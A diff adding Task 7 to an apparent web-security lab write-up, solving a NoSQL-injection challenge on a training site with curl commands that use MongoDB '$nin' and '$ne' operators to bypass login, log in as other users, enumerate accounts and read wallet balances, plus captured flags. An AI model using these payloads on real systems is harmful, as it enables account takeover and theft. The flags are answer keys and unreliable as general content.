@@ -1035,3 +1035,253 @@ git commit -m "6-flag.txt"
 git push
 ```
 
+
+## Task 7. NoSQLi - Enumerating for Profit
+
+After mastering the technique of bypassing the login mechanism through NoSQL injection, your ultimate challenge within this project emerges.\
+This task requires you to leverage your **NoSQL injection** skills further to enumerate login attempts.\
+Your mission: identify a **user profile** with sufficient balance and engage in cryptocurrency exchange activities on the platform to accumulate at least 1 HBTNc coin.\
+Success in this endeavor will not only demonstrate mastery of NoSQL injection techniques but also highlight your ability to apply these skills strategically for financial gain within the simulation.
+
+- Target URL: `http://web0x01.hbtn/a3/nosql_injection`
+
+*FLAG will only appear after claiming at least 1 `HBTNc`*
+
+---
+
+Useful instructions:
+1. Return to the login endpoint where you previously achieved bypass. This time, focus on enumerating different user profiles to find one with a notable account balance.
+2. Employ NoSQL injection techniques in the login process to iterate through user accounts. Take note of the structure and feedback from successful bypasses to refine your enumeration process.
+3. Upon identifying an account with enough balance, navigate to the cryptocurrency exchange feature within the application. Engage in transactions that will allow you to acquire at least 1 HBTNc coin.
+4. Your transactions must be carefully calculated to ensure that the account balance is exchanged for the exact or higher amount of HBTNc coins required.
+5. Monitor the application's feedback and responses closely during the exchange process. The acquisition of 1 or more HBTNc coins will trigger the appearance of a \`Flag\`, signifying your triumph in this comprehensive NoSQL injection challenge.
+
+Remember:
+- Approach this task with the mindset of a security professional, understanding that the techniques demonstrated are for educational purposes within this simulated environment.
+- The skills applied in this task should be used responsibly and ethically in real-world scenarios, adhering to legal and professional standards.
+
+
+## **Solution**:
+
+
+Since we already confirmed MongoDB operator injection in `/sign_in`, we can exploit the `$nin` operator to discover accounts systematically.
+
+## Step 1: Authenticate as an arbitrary user
+
+MongoDB's `$nin` means **not in**. For example:
+
+```
+{"username":{"$nin":["yosri"]}}
+```
+
+This matches any username except `yosri`.
+
+More interestingly:
+
+```
+{"username":{"$nin":[]}}
+```
+
+An empty exclusion list matches any existing username field.
+
+Combined with the password bypass, this may authenticate us as the first matching user.
+
+Executing this command:
+
+```bash
+curl -sS -c /tmp/hbtn-task7.cookies -X POST \
+  'http://web0x01.hbtn/api/a3/nosql_injection/sign_in' \
+  -H 'Content-Type: application/json' \
+  -d '{"username":{"$nin":[]},"password":{"$ne":null}}' | jq .
+# {
+#   "status": "success",
+#   "message": "Congratulations For your Sign in!\nFLAG: 85ce687f6f297f4544dff20a24493751"
+# }
+```
+
+### How we'll enumerate users
+
+First login
+
+Authenticate with `$nin: []`, then inspect the selected user's profile through `/user_info`.
+
+Second login
+
+Exclude the discovered username using `$nin: ["first_user"]`. MongoDB can then select a different account.
+
+Repeat
+
+Add each discovered username to `$nin` and repeat until no additional accounts match.
+
+This approach depends on the login endpoint accepting `$nin` and revealing the matched account through the authenticated profile.
+
+Once we can enumerate accounts, we'll compare their balances to find one capable of purchasing at least 1 HBTNc.
+
+
+### Identify which user we logged in as
+
+The login endpoint returns a generic success message, not the authenticated username.
+
+However, we previously discovered this endpoint:
+
+```
+GET /api/a3/nosql_injection/user_info
+```
+
+Let's use the saved session cookie to retrieve the authenticated user's profile.
+
+Executing this one command:
+
+```bash
+curl -sS -b /tmp/hbtn-task7.cookies \
+  'http://web0x01.hbtn/api/a3/nosql_injection/user_info' | jq .
+
+# {
+#   "status": "success",
+#   "message": {
+#     "username": "foued",
+#     "diff": 6.19,
+#     "trend": "up",
+#     "wallet": [
+#       {
+#         "coin": "HBTNc",
+#         "diff": "2.78",
+#         "trend": "down",
+#         "amount": 0.015,
+#         "value": "93927.15",
+#         "usd_amount": "1408.91"
+#       },
+#       {
+#         "coin": "BTC",
+#         "diff": "0.94",
+#         "trend": "up",
+#         "amount": 0.01,
+#         "value": "49614.41",
+#         "usd_amount": "496.14"
+#       },
+#       {
+#         "coin": "ETH",
+#         "diff": "4.59",
+#         "trend": "up",
+#         "amount": 0.3,
+#         "value": "3050.70",
+#         "usd_amount": "915.21"
+#       },
+#       {
+#         "coin": "USD",
+#         "diff": "0",
+#         "trend": "up",
+#         "amount": 1242,
+#         "value": 1,
+#         "usd_amount": 1242
+#       }
+#     ],
+#     "amount": "4062.26",
+#     "earning": [
+#       {
+#         "name": "HBTNc",
+#         "fill": "var(--joy-palette-primary-500)",
+#         "value": 34
+#       },
+#       {
+#         "name": "USD",
+#         "fill": "var(--joy-palette-primary-500)",
+#         "value": 30
+#       },
+#       {
+#         "name": "ETH",
+#         "fill": "var(--joy-palette-primary-500)",
+#         "value": 22
+#       },
+#       {
+#         "name": "BTC",
+#         "fill": "var(--joy-palette-primary-500)",
+#         "value": 12
+#       }
+#     ],
+#     "_id": "6adf7a01a45582ab6cd49236"
+#   }
+# }
+```
+
+### What we're doing
+
+- `-b /tmp/hbtn-task7.cookies`: Sends the session cookie saved during your last login.
+- `/user_info`: Requests information about the authenticated account.
+- `jq .`: Formats the returned JSON.
+
+We're looking for the username, account balance, and cryptocurrency holdings.
+
+Once we identify the first account, we can use `$nin` to exclude it and attempt to enumerate another account.
+
+
+We've successfully enumerated our first account: `foued`.
+
+Here's what we found:
+
+| Asset | Holdings | USD value |
+| ----- | -------- | --------- |
+| HBTNc | 0.015    | $1,408.91 |
+| BTC   | 0.01     | $496.14   |
+| ETH   | 0.3      | $915.21   |
+| USD   | 1,242    | $1,242.00 |
+| Total |          | $4,062.26 |
+
+At approximately $93,927 per HBTNc, this account doesn't have enough assets to reach our target of 1 HBTNc.
+
+## Step 3: Enumerate the next user
+
+Now we'll exploit `$nin` to exclude `foued`, authenticate as another account, and retrieve its profile.
+
+Execute this single shell command:
+
+```
+curl -sS -c /tmp/hbtn-task7.cookies \
+  -X POST \
+  'http://web0x01.hbtn/api/a3/nosql_injection/sign_in' \
+  -H 'Content-Type: application/json' \
+  -d '{"username":{"$nin":["foued"]},"password":{"$ne":null}}' \
+  | jq -e '.status == "success"' >/dev/null && \
+curl -sS -b /tmp/hbtn-task7.cookies \
+  'http://web0x01.hbtn/api/a3/nosql_injection/user_info' \
+  | jq '.message | {username, amount, wallet}'
+```
+
+### What changed?
+
+The injection now contains:
+
+```
+{"username":{"$nin":["foued"]}}
+```
+
+This instructs MongoDB to find an account whose username is not `foued`.
+
+The first request authenticates and saves the session. The second retrieves the newly selected account's username and wallet.
+
+If we find another account, we can exclude both usernames on the following attempt:
+
+```
+{"$nin":["foued","next_username"]}
+```
+
+That gives us a systematic enumeration technique without knowing the usernames in advance.
+
+We'll examine the next balance and continue searching for an account that can afford at least 1 HBTNc.
+
+
+
+
+...
+
+
+...
+
+
+
+```bash
+echo a62eb367da5d58914bd9aaa074cf3444 > 7-flag.txt
+git add .
+git commit -m "7-flag.txt"
+git push
+```
